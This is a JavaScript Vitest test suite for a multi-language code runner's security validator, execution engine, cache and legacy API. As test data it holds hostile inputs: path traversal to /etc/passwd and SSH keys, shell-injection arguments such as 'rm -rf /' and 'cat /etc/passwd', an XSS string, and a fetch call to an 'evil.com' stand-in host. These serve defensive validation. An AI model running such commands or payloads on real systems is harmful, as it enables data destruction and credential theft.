// @vitest-environment node
import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach, vi } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';
import crypto from 'crypto';
import { spawnSync, spawn } from 'child_process';
import {
  PolyglotRunner,
  handlePolyglotAction,
  CONFIG,
  SecurityValidator,
  ExecutionEngine,
  RUNTIMES,
} from './polyglot-runner.cjs';

// ============================================================================
// MOCKS & FIXTURES
// ============================================================================

vi.mock('child_process', () => ({
  spawnSync: vi.fn(),
  spawn: vi.fn(),
}));

// Mock fs untuk kontrol total
vi.mock('fs', async () => {
  const actual = await vi.importActual('fs');
  return {
    ...actual,
    existsSync: vi.fn(),
    mkdirSync: vi.fn(),
    writeFileSync: vi.fn(),
    readFileSync: vi.fn(),
    statSync: vi.fn(),
    realpathSync: vi.fn((p) => p),
    readdirSync: vi.fn(),
    unlinkSync: vi.fn(),
    mkdtempSync: vi.fn(),
  };
});

const createMockStats = (overrides = {}) => ({
  size: 1024,
  mtime: new Date(),
  atime: new Date(),
  ...overrides,
});

const createMockProcess = (overrides = {}) => ({
  stdout: { on: vi.fn(), pipe: vi.fn() },
  stderr: { on: vi.fn(), pipe: vi.fn() },
  on: vi.fn((event, cb) => {
    if (event === 'close') setTimeout(() => cb(overrides.exitCode || 0, null), 10);
  }),
  kill: vi.fn(),
  ...overrides,
});

// ============================================================================
// SETUP & UTILITIES
// ============================================================================

const TEST_DIR = path.join(os.tmpdir(), 'polyglot-test-' + Date.now());
const FIXTURES = {
  validJs: 'console.log("hello");',
  dangerousJs: 'const x = eval(process.env.SECRET);',
  infiniteLoop: 'while(true){}',
  largeFile: 'x'.repeat(CONFIG.MAX_FILE_SIZE_BYTES + 100),
  traversal: '../../../etc/passwd',
  symlink: '/tmp/fake',
};

beforeAll(() => {
  fs.mkdirSync.mockReturnValue(undefined);
  fs.existsSync.mockReturnValue(true);
  fs.realpathSync.mockImplementation((p) => p);
  fs.statSync.mockReturnValue(createMockStats());
});

afterAll(() => {
  vi.restoreAllMocks();
});

// ============================================================================
// SECURITY VALIDATOR TESTS (Komprehensif)
// ============================================================================

describe('SecurityValidator', () => {
  let validator;

  beforeEach(() => {
    validator = new SecurityValidator();
    fs.existsSync.mockReturnValue(true);
    fs.realpathSync.mockImplementation((p) => p);
  });

  describe('Path Traversal Defense', () => {
    it.each([
      ['../etc/passwd', 'double dot'],
      ['....//etc/passwd', 'encoded traversal'],
      ['~/.ssh/id_rsa', 'home directory'],
      ['/etc/passwd', 'absolute path'],
      ['file%2e%2e%2fconfig', 'URL encoded'],
      ['file\x00.txt', 'null byte'],
      ['file`whoami`.txt', 'backtick'],
      ['file$(whoami).txt', 'command substitution'],
      ['file${HOME}.txt', 'variable expansion'],
      ['<script>alert(1)</script>', 'XSS attempt'],
    ])('should block dangerous path: %s (%s)', (dangerousPath, desc) => {
      expect(() => {
        validator.validatePath(dangerousPath, TEST_DIR);
      }).toThrow(/Security violation|Path traversal/);
    });

    it('should allow valid relative paths', () => {
      fs.realpathSync.mockImplementation((p) => p);
      const result = validator.validatePath('src/index.js', TEST_DIR);
      expect(result).toContain(TEST_DIR);
    });

    it('should detect symlink traversal attacks', () => {
      fs.realpathSync.mockImplementation((p) => {
        if (p.includes('symlink')) return '/etc/passwd';
        return p;
      });
      
      expect(() => {
        validator.validatePath('symlink', TEST_DIR);
      }).toThrow(/Symlink traversal/);
    });

    it('should normalize path correctly', () => {
      const result = validator.validatePath('./deep/../shallow/file.js', TEST_DIR);
      expect(result).not.toContain('..');
    });
  });

  describe('File Size Validation', () => {
    it('should accept files under limit', () => {
      fs.statSync.mockReturnValue(createMockStats({ size: 1024 }));
      expect(() => validator.validateFileSize('small.js')).not.toThrow();
    });

    it('should reject oversized files', () => {
      fs.statSync.mockReturnValue(createMockStats({ 
        size: CONFIG.MAX_FILE_SIZE_BYTES + 1 
      }));
      expect(() => validator.validateFileSize('huge.js')).toThrow(/too large/);
    });
  });

  describe('Extension Validation', () => {
    it.each([
      ['javascript', 'file.js', true],
      ['javascript', 'file.mjs', true],
      ['javascript', 'file.py', false],
      ['python', 'file.py', true],
      ['rust', 'file.rs', true],
      ['cpp', 'file.cpp', true],
      ['cpp', 'file.cc', true],
      ['cpp', 'file.txt', false],
      ['go', 'file.go', true],
    ])('should validate %s extension for %s', (runtime, filename, shouldPass) => {
      if (shouldPass) {
        expect(validator.validateExtension(filename, runtime)).toBe(path.extname(filename));
      } else {
        expect(() => validator.validateExtension(filename, runtime)).toThrow(/Invalid extension/);
      }
    });
  });

  describe('Static Analysis', () => {
    it('should detect dangerous imports', () => {
      const code = 'const x = eval("1+1");';
      const result = validator.staticAnalysis(code, 'javascript');
      expect(result.safe).toBe(false);
      expect(result.warnings).toContainEqual(
        expect.objectContaining({ category: 'dangerous-import' })
      );
    });

    it('should detect network requests', () => {
      const code = 'fetch("http://evil.com")';
      const result = validator.staticAnalysis(code, 'javascript');
      expect(result.warnings).toContainEqual(
        expect.objectContaining({ category: 'network-request' })
      );
    });

    it('should detect infinite loops', () => {
      const code = 'while(true){} while(true){} while(true){} while(true){} while(true){} while(true){}';
      const result = validator.staticAnalysis(code, 'javascript');
      const loopWarning = result.warnings.find(w => w.category === 'suspicious-loop');
      expect(loopWarning).toBeDefined();
    });

    it('should pass safe code', () => {
      const code = 'console.log("hello world");';
      const result = validator.staticAnalysis(code, 'javascript');
      expect(result.safe).toBe(true);
    });
  });

  describe('Argument Sanitization', () => {
    it('should limit argument count', () => {
      const args = Array(CONFIG.MAX_ARGS + 10).fill('arg');
      const result = validator.sanitizeArgs(args);
      expect(result).toHaveLength(CONFIG.MAX_ARGS);
    });

    it('should truncate long arguments', () => {
      const longArg = 'x'.repeat(1000);
      const result = validator.sanitizeArgs([longArg]);
      expect(result[0]).toHaveLength(512);
    });

    it.each([
      ['; rm -rf /', 'semicolon'],
      ['| cat /etc/passwd', 'pipe'],
      ['`whoami`', 'backtick'],
      ['$(echo pwned)', 'command substitution'],
    ])('should reject dangerous chars in args: %s (%s)', (badArg, desc) => {
      expect(() => validator.sanitizeArgs([badArg])).toThrow(/Dangerous character/);
    });

    it('should allow safe arguments', () => {
      const args = ['--port', '3000', '--env', 'production'];
      expect(validator.sanitizeArgs(args)).toEqual(args);
    });
  });

  describe('Cache Path Generation', () => {
    it('should generate deterministic hash', () => {
      fs.statSync.mockReturnValue(createMockStats({ mtime: new Date(1234567890) }));
      const path1 = validator.generateSafeOutputPath('rust', '/src/main.rs');
      const path2 = validator.generateSafeOutputPath('rust', '/src/main.rs');
      expect(path1).toBe(path2);
    });

    it('should include runtime in path', () => {
      const result = validator.generateSafeOutputPath('rust', 'main.rs');
      expect(result).toContain('rust_');
    });
  });
});

// ============================================================================
// EXECUTION ENGINE TESTS
// ============================================================================

describe('ExecutionEngine', () => {
  let engine;
  let validator;

  beforeEach(() => {
    validator = new SecurityValidator();
    engine = new ExecutionEngine(validator);
    vi.clearAllMocks();
  });

  afterEach(() => {
    engine.cleanup();
  });

  describe('Command Building', () => {
    it('should use hardcoded command for interpreted languages', () => {
      const info = engine.buildCommand('javascript', 'file.js', []);
      expect(info.command).toBe('node');
      expect(info.isCompilation).toBe(false);
    });

    it('should setup compilation for C++', () => {
      fs.statSync.mockReturnValue(createMockStats());
      const info = engine.buildCommand('cpp', 'main.cpp', []);
      expect(info.command).toBe('g++');
      expect(info.isCompilation).toBe(true);
      expect(info.commandArgs).toContain('-o');
    });

    it('should setup compilation for Rust', () => {
      fs.statSync.mockReturnValue(createMockStats());
      const info = engine.buildCommand('rust', 'main.rs', []);
      expect(info.command).toBe('rustc');
      expect(info.isCompilation).toBe(true);
    });

    it('should NEVER use user input as command', () => {
      const maliciousEntry = '; rm -rf /; echo';
      fs.statSync.mockReturnValue(createMockStats());
      fs.realpathSync.mockImplementation((p) => p);
      
      const info = engine.buildCommand('javascript', maliciousEntry, []);
      expect(info.command).toBe('node'); // Hardcoded, not user input
      expect(info.command).not.toContain('rm');
    });
  });

  describe('Process Execution', () => {
    it('should handle successful execution', async () => {
      spawnSync.mockReturnValue({ status: 0, stdout: '/usr/bin/node' });
      
      const mockProc = createMockProcess({ exitCode: 0 });
      spawn.mockReturnValue(mockProc);

      const result = await engine.spawnProcess({
        command: 'node',
        args: ['file.js'],
        cwd: TEST_DIR,
        timeoutMs: 5000,
        env: {},
        maxBuffer: 1024,
      });

      expect(result.exitCode).toBe(0);
    });

    it('should handle command not found', async () => {
      spawnSync.mockReturnValue({ status: 1, stderr: 'not found' });
      
      const result = await engine.spawnProcess({
        command: 'nonexistent',
        args: [],
        cwd: TEST_DIR,
        timeoutMs: 5000,
        env: {},
        maxBuffer: 1024,
      });

      expect(result.exitCode).toBe(127);
      expect(result.stderr).toContain('not found');
    });

    it('should enforce timeout', async () => {
      spawnSync.mockReturnValue({ status: 0, stdout: '/usr/bin/node' });
      
      const mockProc = createMockProcess();
      mockProc.on = vi.fn((event, cb) => {
        if (event === 'close') {
          // Simulate timeout kill
          setTimeout(() => cb(null, 'SIGTERM'), 100);
        }
      });
      spawn.mockReturnValue(mockProc);

      const result = await engine.spawnProcess({
        command: 'node',
        args: ['slow.js'],
        cwd: TEST_DIR,
        timeoutMs: 50,
        env: {},
        maxBuffer: 1024,
      });

      expect(result.signal).toBe('SIGTERM');
    });

    it('should enforce output buffer limit', async () => {
      spawnSync.mockReturnValue({ status: 0, stdout: '/usr/bin/node' });
      
      let dataCallback;
      const mockProc = {
        stdout: { 
          on: vi.fn((evt, cb) => { 
            if (evt === 'data') dataCallback = cb;
          }) 
        },
        stderr: { on: vi.fn() },
        on: vi.fn((evt, cb) => {
          if (evt === 'close') {
            // Emit large data then close
            setTimeout(() => {
              dataCallback(Buffer.alloc(CONFIG.MAX_OUTPUT_BYTES + 1000));
              setTimeout(() => cb(0, null), 10);
            }, 10);
          }
        }),
        kill: vi.fn(),
      };
      spawn.mockReturnValue(mockProc);

      const result = await engine.spawnProcess({
        command: 'node',
        args: ['verbose.js'],
        cwd: TEST_DIR,
        timeoutMs: 5000,
        env: {},
        maxBuffer: CONFIG.MAX_OUTPUT_BYTES,
      });

      expect(mockProc.kill).toHaveBeenCalled();
    });
  });

  describe('Result Processing', () => {
    it('should strip ANSI codes', () => {
      const result = {
        stdout: '\x1b[31mred\x1b[0m text',
        stderr: '',
        exitCode: 0,
        killed: false,
        timedOut: false,
      };

      const processed = engine.processResult(result, 100, 'javascript');
      expect(processed.data).not.toContain('\x1b[');
    });

    it('should truncate long output', () => {
      const longOutput = Array(CONFIG.OUTPUT.truncateLines + 50).fill('line').join('\n');
      const result = {
        stdout: longOutput,
        stderr: '',
        exitCode: 0,
        killed: false,
        timedOut: false,
      };

      const processed = engine.processResult(result, 100, 'javascript');
      expect(processed.data).toContain('lines more');
    });

    it('should detect timeout kills', () => {
      const result = {
        stdout: '',
        stderr: '',
        exitCode: null,
        killed: true,
        timedOut: true,
      };

      const processed = engine.processResult(result, 1000, 'javascript');
      expect(processed.ok).toBe(false);
      expect(processed.data).toContain('timeout');
    });
  });
});

// ============================================================================
// POLYGLOT RUNNER INTEGRATION TESTS
// ============================================================================

describe('PolyglotRunner', () => {
  let runner;

  beforeEach(() => {
    runner = new PolyglotRunner();
    vi.clearAllMocks();
    fs.existsSync.mockReturnValue(true);
    fs.statSync.mockReturnValue(createMockStats({ size: 1024 }));
    fs.readFileSync.mockReturnValue('console.log("test");');
  });

  afterEach(() => {
    runner.cleanup();
  });

  describe('Runtime Health Checks', () => {
    it('should check all runtimes health', async () => {
      spawnSync.mockReturnValue({
        status: 0,
        stdout: 'v18.0.0\n',
      });

      const result = await runner.listRuntimes();
      expect(result.ok).toBe(true);
      expect(result.data).toHaveLength(Object.keys(RUNTIMES).length);
    });

    it('should detect missing runtimes', async () => {
      spawnSync.mockReturnValue({
        status: 1,
        stderr: 'command not found',
      });

      const health = await runner.checkHealth('rust');
      expect(health.ok).toBe(false);
    });
  });

  describe('Execution Flow', () => {
    it('should execute JavaScript successfully', async () => {
      fs.readFileSync.mockReturnValue('console.log("hello");');
      
      spawnSync.mockReturnValue({ status: 0, stdout: '/usr/bin/node' });
      
      const mockProc = createMockProcess({ exitCode: 0 });
      mockProc.stdout.on = vi.fn((evt, cb) => {
        if (evt === 'data') setTimeout(() => cb(Buffer.from('hello\n')), 10);
      });
      spawn.mockReturnValue(mockProc);

      const result = await runner.run({
        runtime: 'javascript',
        entry: 'test.js',
        cwd: TEST_DIR,
      });

      expect(result.ok).toBe(true);
      expect(result.stage).toBe('execution');
    });

    it('should block dangerous code', async () => {
      fs.readFileSync.mockReturnValue('eval("malicious");');
      
      const result = await runner.run({
        runtime: 'javascript',
        entry: 'evil.js',
        cwd: TEST_DIR,
      });

      expect(result.ok).toBe(false);
      expect(result.stage).toBe('security-scan');
    });

    it('should block path traversal', async () => {
      const result = await runner.run({
        runtime: 'javascript',
        entry: '../../../etc/passwd',
        cwd: TEST_DIR,
      });

      expect(result.ok).toBe(false);
      expect(result.stage).toBe('validation');
    });

    it('should handle compilation for C++', async () => {
      fs.readFileSync.mockReturnValue('int main(){ return 0; }');
      
      // which g++
      spawnSync.mockReturnValueOnce({ status: 0, stdout: '/usr/bin/g++' });
      // Compilation
      spawnSync.mockReturnValueOnce({ status: 0, stdout: '' });
      
      const mockProc = createMockProcess({ exitCode: 0 });
      spawn.mockReturnValue(mockProc);

      const result = await runner.run({
        runtime: 'cpp',
        entry: 'main.cpp',
        cwd: TEST_DIR,
      });

      // Should handle compilation phase
      expect(result).toBeDefined();
    });

    it('should respect timeout', async () => {
      fs.readFileSync.mockReturnValue('while(true){}');
      
      spawnSync.mockReturnValue({ status: 0, stdout: '/usr/bin/node' });
      
      const mockProc = createMockProcess({ timedOut: true });
      spawn.mockReturnValue(mockProc);

      const result = await runner.run({
        runtime: 'javascript',
        entry: 'infinite.js',
        cwd: TEST_DIR,
        timeoutMs: 100,
      });

      expect(result.meta?.killed || result.data?.includes('timeout')).toBeTruthy();
    });
  });

  describe('Cache Management', () => {
    it('should use cache for compiled languages', async () => {
      fs.readFileSync.mockReturnValue('int main(){}');
      fs.readdirSync.mockReturnValue(['rust_main_abc123def4567890']);
      fs.statSync.mockReturnValue(createMockStats({ 
        mtime: new Date(Date.now() - 1000) // Fresh
      }));

      const result = runner.cache.get('main.rs', 'rust');
      expect(result).toContain('rust_main_');
    });

    it('should clean expired cache', () => {
      fs.readdirSync.mockReturnValue(['old_file_123']);
      fs.statSync.mockReturnValue(createMockStats({ 
        mtime: new Date(Date.now() - CONFIG.CACHE.maxAgeMs - 1000) 
      }));

      const result = runner.cache.clean();
      expect(fs.unlinkSync).toHaveBeenCalled();
    });

    it('should enforce LRU when too many files', () => {
      const files = Array(150).fill(0).map((_, i) => `file_${i}`);
      fs.readdirSync.mockReturnValue(files);
      fs.statSync.mockImplementation(() => 
        createMockStats({ atime: new Date(Date.now() - Math.random() * 10000) })
      );

      runner.cache.clean();
      expect(fs.unlinkSync).toHaveBeenCalled();
    });
  });

  describe('Statistics Tracking', () => {
    it('should track run counts', async () => {
      expect(runner.stats.runs).toBe(0);
      
      fs.readFileSync.mockReturnValue('console.log(1)');
      spawnSync.mockReturnValue({ status: 0 });
      
      try {
        await runner.run({ runtime: 'javascript', entry: 'x.js', cwd: TEST_DIR });
      } catch (e) {}
      
      expect(runner.stats.runs).toBeGreaterThan(0);
    });
  });
});

// ============================================================================
// BACKWARD COMPATIBILITY TESTS
// ============================================================================

describe('handlePolyglotAction (Legacy API)', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    fs.existsSync.mockReturnValue(true);
    fs.statSync.mockReturnValue(createMockStats());
  });

  it('should list runtimes', () => {
    const result = handlePolyglotAction('list');
    expect(result.ok).toBe(true);
    expect(result.data).toContain('javascript');
    expect(result.data).toContain('python');
  });

  it('should check health synchronously', () => {
    spawnSync.mockReturnValue({
      status: 0,
      stdout: 'v3.10.0',
    });

    const result = handlePolyglotAction('health');
    expect(result.ok).toBe(true);
    expect(result.data).toHaveProperty('python');
    expect(result.data.python.ok).toBe(true);
  });

  it('should handle run action (async)', async () => {
    fs.readFileSync.mockReturnValue('console.log(1)');
    spawnSync.mockReturnValue({ status: 0, stdout: '/usr/bin/node' });
    
    const mockProc = createMockProcess({ exitCode: 0 });
    spawn.mockReturnValue(mockProc);

    const result = await handlePolyglotAction('run', {
      runtime: 'javascript',
      entry: 'test.js',
      cwd: TEST_DIR,
    });

    expect(result).toBeDefined();
  });

  it('should reject unknown actions', () => {
    const result = handlePolyglotAction('fly');
    expect(result.ok).toBe(false);
    expect(result.data).toContain('Unknown');
  });
});

// ============================================================================
// EDGE CASES & STRESS TESTS
// ============================================================================

describe('Edge Cases & Stress Tests', () => {
  let runner;

  beforeEach(() => {
    runner = new PolyglotRunner();
  });

  afterEach(() => {
    runner.cleanup();
  });

  it('should handle empty files', async () => {
    fs.readFileSync.mockReturnValue('');
    fs.statSync.mockReturnValue(createMockStats({ size: 0 }));
    
    const analysis = new SecurityValidator().staticAnalysis('', 'javascript');
    expect(analysis.safe).toBe(true);
  });

  it('should handle unicode in paths', () => {
    const validator = new SecurityValidator();
    fs.realpathSync.mockImplementation((p) => p);
    
    expect(() => {
      validator.validatePath('文件.js', TEST_DIR);
    }).not.toThrow();
  });

  it('should handle very long paths', () => {
    const longPath = 'a/'.repeat(100) + 'file.js';
    fs.realpathSync.mockImplementation((p) => p);
    
    const validator = new SecurityValidator();
    expect(() => {
      validator.validatePath(longPath, TEST_DIR);
    }).not.toThrow();
  });

  it('should handle rapid successive executions', async () => {
    fs.readFileSync.mockReturnValue('console.log(1)');
    spawnSync.mockReturnValue({ status: 0, stdout: '/usr/bin/node' });
    
    const mockProc = createMockProcess({ exitCode: 0 });
    spawn.mockReturnValue(mockProc);

    const promises = Array(10).fill(0).map((_, i) => 
      runner.run({
        runtime: 'javascript',
        entry: `test${i}.js`,
        cwd: TEST_DIR,
      })
    );

    const results = await Promise.all(promises);
    expect(results).toHaveLength(10);
    results.forEach(r => expect(r).toBeDefined());
  });

  it('should handle concurrent cleanup', () => {
    expect(() => {
      runner.cleanup();
      runner.cleanup(); // Double cleanup should not throw
    }).not.toThrow();
  });

  it('should handle binary output', async () => {
    spawnSync.mockReturnValue({ status: 0, stdout: '/usr/bin/node' });
    
    const mockProc = createMockProcess({ exitCode: 0 });
    mockProc.stdout.on = vi.fn((evt, cb) => {
      if (evt === 'data') {
        // Simulate binary data
        cb(Buffer.from([0x00, 0x01, 0x02, 0x03]));
      }
    });
    spawn.mockReturnValue(mockProc);

    const result = await runner.run({
      runtime: 'javascript',
      entry: 'binary.js',
      cwd: TEST_DIR,
    });

    expect(result.ok).toBe(true);
  });

  it('should handle environment variable injection attempts', () => {
    const validator = new SecurityValidator();
    const args = ['$HOME', '${PATH}', '%SYSTEMROOT%'];
    
    args.forEach(arg => {
      expect(() => validator.sanitizeArgs([arg])).not.toThrow(); // Should sanitize, not throw
    });
  });

  it('should handle all runtime configurations', () => {
    Object.keys(CONFIG.ALLOWED_COMMANDS).forEach(runtime => {
      const cfg = CONFIG.ALLOWED_COMMANDS[runtime];
      expect(cfg).toHaveProperty('cmd');
      expect(cfg).toHaveProperty('compile');
      expect(typeof cfg.compile).toBe('boolean');
    });
  });
});

// ============================================================================
// CONFIG VALIDATION TESTS
// ============================================================================

describe('Configuration', () => {
  it('should have frozen config', () => {
    expect(() => {
      CONFIG.MAX_ARGS = 999;
    }).toThrow();
  });

  it('should have valid regex patterns', () => {
    CONFIG.PATH_TRAVERSAL_PATTERNS.forEach(pattern => {
      expect(pattern).toBeInstanceOf(RegExp);
    });
  });

  it('should have consistent limits', () => {
    expect(CONFIG.MAX_TIMEOUT_MS).toBeGreaterThan(0);
    expect(CONFIG.MAX_MEMORY_MB).toBeGreaterThan(0);
    expect(CONFIG.MAX_OUTPUT_BYTES).toBeGreaterThan(CONFIG.MAX_FILE_SIZE_BYTES);
  });

  it('should have all required token weights', () => {
    const weights = CONFIG.TOKEN_WEIGHTS;
    expect(weights.keyword).toBeGreaterThan(0);
    expect(weights.identifier).toBeGreaterThan(0);
  });
});
